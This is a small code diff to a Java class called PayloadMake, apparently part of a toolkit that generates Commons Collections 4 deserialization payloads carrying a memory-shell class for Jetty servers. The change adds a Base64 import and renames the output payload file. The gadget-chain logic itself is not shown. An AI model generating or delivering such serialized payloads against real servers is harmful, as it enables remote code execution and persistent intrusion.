@@ -4,6 +4,7 @@ import me.gv7.tools.josearcher.entity.Blacklist;
 import me.gv7.tools.josearcher.entity.Keyword;
 import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
 import org.example.jetty.gadget.JettyEcho;
+import org.ppp.tools.encryption.B64;
 import org.ppp.tools.ser.CC4Generator;
 
 import java.util.ArrayList;
@@ -22,7 +23,7 @@ public class PayloadMake {
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
-        cc4Generator.makeFile(msmClass, "cc4.bin");
+        cc4Generator.makeFile(msmClass, "dev/JettyEcho.bin");
     }
 
     public void searchJetty() {
